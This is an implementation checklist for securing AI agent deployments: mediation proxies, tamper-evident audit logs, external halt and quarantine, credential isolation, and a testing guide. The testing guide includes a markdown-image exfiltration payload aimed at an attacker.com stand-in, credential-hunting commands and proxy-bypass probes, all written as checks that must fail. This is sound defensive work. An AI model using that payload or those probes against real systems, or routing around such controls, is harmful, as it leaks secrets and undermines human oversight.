# ASK Implementation Checklist — ASK 2026.03

Use this checklist to verify that an agent system satisfies the ASK framework.
Each item produces a clear pass/fail. A "No" to any item in Element or Tenet sections
is a framework violation that must be remediated.

---

## Table of Contents

1. [Element Verification](#element-verification)
2. [Cognitive Model Verification](#cognitive-model-verification)
3. [Tenet Verification](#tenet-verification)
4. [Architecture Checklist](#architecture-checklist)
5. [Multi-Agent Checklist](#multi-agent-checklist)
6. [Violation Severity Reference](#violation-severity-reference)
7. [Testing Guide](#testing-guide)

---

## Element Verification

### Workspace (Element 1)

- [ ] Agent runtime (container, VM, namespace) provisioned by infrastructure — not created by agent
- [ ] Agent cannot modify its own workspace configuration (network policy, tools, resource limits)
- [ ] Agent's root filesystem is read-only
- [ ] Agent runs as non-root user with no unnecessary capabilities (`cap_drop: ALL`)
- [ ] `no-new-privileges` flag is set (or equivalent)
- [ ] Resource limits defined and enforced (CPU, memory)
- [ ] Workspace initialized before agent exists — enforcement running before agent process starts

### Mediation Layer (Element 2)

- [ ] All LLM calls route through LLM proxy — no direct LLM provider API access
- [ ] All web/network egress routes through egress proxy — no direct internet access
- [ ] No network path from agent to external resources bypasses proxy layer
- [ ] Agent cannot see, reach, or modify proxy configuration or policies
- [ ] Proxy configuration in separate isolation boundary from agent
- [ ] Egress proxy enforces domain denylist
- [ ] LLM proxy authenticates with scoped key (not master key)
- [ ] LLM proxy enforces model restrictions, spend caps, rate limits per agent
- [ ] Pre-call XPIA scanning on input before it reaches the LLM
- [ ] Post-call scanning on LLM responses before return to agent
- [ ] DNS resolution controlled — no arbitrary DNS resolvers or DNS-over-HTTPS
- [ ] Per-agent enforcer sidecar mediates all HTTP traffic
- [ ] Service credential grants mediated by enforcer — agent holds scoped tokens
- [ ] Service grant/revoke takes effect immediately via hot reload
- [ ] Enforcer strips provider-identifying response headers

### Audit Log (Element 3)

- [ ] Logs written by mediation layer, NOT by agent
- [ ] Agent has no write access to audit logs
- [ ] Audit logs are tamper-evident (separate volume or external system)
- [ ] Egress proxy events logged in structured format
- [ ] LLM proxy events logged (request, response, guardrail triggers, token counts)
- [ ] Logs from all layers correlatable (shared correlation ID)
- [ ] Logs survive workspace restarts and reimaging

### Human Override (Element 4)

- [ ] Mechanism exists to halt agent immediately from outside agent's process
- [ ] Halting does not require agent's cooperation
- [ ] Halted agent's state is preserved
- [ ] Halt mechanism has been tested in practice
- [ ] Operator can observe agent's current state
- [ ] Operator can review agent activity via audit logs
- [ ] Operator can revoke credentials without restarting agent container

---

## Cognitive Model Verification

- [ ] Security-relevant config (risk tolerance, escalation thresholds, permissions, tier) on `:ro` mount
- [ ] Agent-owned writable storage (memory, personality, knowledge) on separate `:rw` mount
- [ ] `:rw` mount (Identity) contains NO security-relevant behavioral parameters
- [ ] Sentinel or equivalent monitors for anomalous writes to Identity layer
- [ ] Constraints layer is version-controlled (every change has author, timestamp, rationale)
- [ ] Constraints updates go through review and approval process
- [ ] Changing Constraints requires host/infrastructure access — cannot be initiated from within agent session

---

## Tenet Verification

Answer Yes or No to each. "No" is a framework violation.

| # | Category | Tenet | Pass? |
|---|---|---|---|
| 1 | Foundation | Enforcement runs OUTSIDE agent's isolation boundary | |
| 2 | Foundation | Logs written by mediation layer; agent has no write access | |
| 3 | Foundation | NO path from agent to external resources bypasses mediation | |
| 4 | Foundation | Capabilities, credentials, mounts scoped to minimum required | |
| 5 | Foundation | Every trust relationship documented, visible, auditable | |
| 6 | Constraint Lifecycle | Constraint changes delivered atomically — no partial state | |
| 7 | Constraint Lifecycle | Complete constraint history logged and retrievable | |
| 8 | Halt Governance | Every halt has complete audit record; state preserved | |
| 9 | Halt Governance | Agent cannot self-resume; resumption requires ≥ halt authority | |
| 10 | Halt Governance | Principal authority is audited — monitors watch the watchers | |
| 11 | Multi-Agent | Coordinator only delegates permissions it explicitly holds | |
| 12 | Multi-Agent | Combined output cannot exceed individual agent authorization | |
| 13 | Principal Model | Principal and agent lifecycles managed independently | |
| 14 | Principal Model | Authority transfers immediately on principal suspension — no vacuum | |
| 15 | Principal Model | Trust cannot be self-elevated; elevation requires human approval | |
| 16 | Security | Quarantine = simultaneous process kill + network sever + FS freeze | |
| 17 | Security | External entities produce data, not instructions | |
| 18 | Security | Unknown entities default to lowest trust | |
| 19 | Security | External agents can share info but cannot instruct internal agents | |
| 20 | Coordination | Unknown conflicts → yield, log, flag | |
| 21 | Coordination | No agent/automated process can remove a human principal | |
| 22 | Coordination | Quarantine does not apply to human principals | |
| 23 | Org Knowledge | Knowledge is durable infrastructure, not agent state | |
| 24 | Org Knowledge | Knowledge access bounded by authorization scope | |

---

## Architecture Checklist

### Network Isolation

- [ ] Agent container on internal network with no direct internet access
- [ ] Only endpoint reachable from agent is enforcer sidecar
- [ ] Agent cannot reach LLM proxy, egress proxy, or mediation network directly
- [ ] All other traffic from agent container dropped at network layer

### Enforcer (Per-Agent HTTP Proxy Sidecar)

- [ ] Each agent has dedicated enforcer sidecar on agent-internal network
- [ ] Enforcer routes LLM requests to providers (via egress) with credential swap
- [ ] Enforcer routes non-LLM HTTP through egress proxy
- [ ] Enforcer logs every request to audit log agent cannot access
- [ ] Service credential swap tested — scoped token replaced at enforcer, not agent

### Runtime Gateway (Sidecar)

- [ ] Gateway runs in separate container sharing only PID namespace with agent
- [ ] Shell commands mediated via shell shim (`/bin/bash` routes through gateway)
- [ ] File operations mediated via FUSE
- [ ] Filesystem access restricted via Landlock or equivalent kernel-level sandboxing
- [ ] Gateway policy files, configuration, and audit logs in filesystem agent cannot access
- [ ] Per-command allow/deny/approve policies defined and tested

### Guardrails Stack

- [ ] Pre-call XPIA scanning configured (pattern detection on input before LLM)
- [ ] Post-call scanning configured (streaming-aware, scans responses before return to agent)
- [ ] Tool permission guard with explicit allowlist (default-deny)
- [ ] MCP tool policy at gateway level (not just application level inside agent)
- [ ] Optional: PII masking, ML-based injection detection, malicious URL scanning

### Credential Management

- [ ] Agent holds scoped API key with model restrictions, budget cap, rate limits
- [ ] Master LLM API key NOT in agent container
- [ ] Provider API keys live only in LLM proxy container
- [ ] Agent credentials rotatable without rebuilding container

---

## Multi-Agent Checklist

Complete this section only for deployments with multiple cooperating agents.

- [ ] Each agent has own container, scoped API key, and egress policy
- [ ] Agents cannot reach each other's containers directly
- [ ] All inter-agent communication through mediated delegation channel
- [ ] Delegation channel validates authorization before passing tasks
- [ ] Delegation channel scans responses from sub-agents before delivering to parent
- [ ] Each delegation logged with correlation ID linking full chain
- [ ] Tier restrictions enforced in key — Tier 1 key cannot make Tier 3 requests
- [ ] MCP server registration blocked at runtime without operator approval
- [ ] MCP server version pinning enabled — tool definition changes block and alert

---

## Violation Severity Reference

| Severity | Criteria | Response |
|---|---|---|
| **Critical** | Agent has write access to audit logs; enforcement runs inside agent boundary; no mediation path for external access | Stop — remediate before proceeding |
| **High** | Master API key accessible to agent; Constraints on `:rw` mount; no runtime gateway; no post-call scanning | Remediate before any sensitive use |
| **Medium** | Missing coverage chain; no MCP tool policy; incomplete egress denylist; no constraint history logging | Remediate within defined timeline |
| **Low** | Missing documentation; incomplete exception routing; no guardrail threshold tuning | Address in next cycle |

**Minimum bar for production:** No Critical violations and no High violations.

---

## Testing Guide

Checking boxes is not the same as verifying enforcement. Test each critical property.

### Mediation is Complete (Tenet 3)
- From inside agent container, attempt direct external reach: `curl -m 5 https://example.com` → must fail
- Attempt to reach LLM proxy directly (bypassing enforcer): `curl -m 5 http://llm-proxy:4000/v1/models` → must fail
- Attempt external DNS: `dig @8.8.8.8 example.com` → must fail
- Attempt DNS-over-HTTPS: `curl -m 5 https://dns.google/resolve?name=example.com` → must be blocked

### Agent Cannot Access Enforcement Infrastructure
- Attempt to read gateway policy, enforcer config, proxy denylist, audit logs → all must fail
- Run `mount` and `df` to verify no unexpected mounts visible

### Credential Isolation
- Search for real API keys: `env | grep -i key`, `find / -name "*.env"` → none found
- Send scoped token directly to service (without enforcer) → must be rejected

### Guardrails Catch Injection
- Send known XPIA payload through normal input path → pre_call or post_call scanner flags it
- Include `![](https://attacker.com/steal?data=secret)` in content → must be caught

### Human Override Works
- With agent actively processing, execute halt from outside → agent stops, state preserved, halt logged
- Attempt self-resume from inside agent → must fail

### Quarantine Works
- Trigger quarantine → process kill + network sever + FS freeze simultaneously
- Verify no agent notification before containment
- Verify state preserved for forensic access

### Fail-Closed Behavior
- Kill enforcer sidecar → agent loses all HTTP access (not bypass to internet)
- Kill egress proxy → agent loses web access (not route around)
- Kill LLM proxy → agent loses LLM access (not fallback to direct provider)
- Restart each → agent recovers without gaining extra access
- Each failure event logged to persistent storage
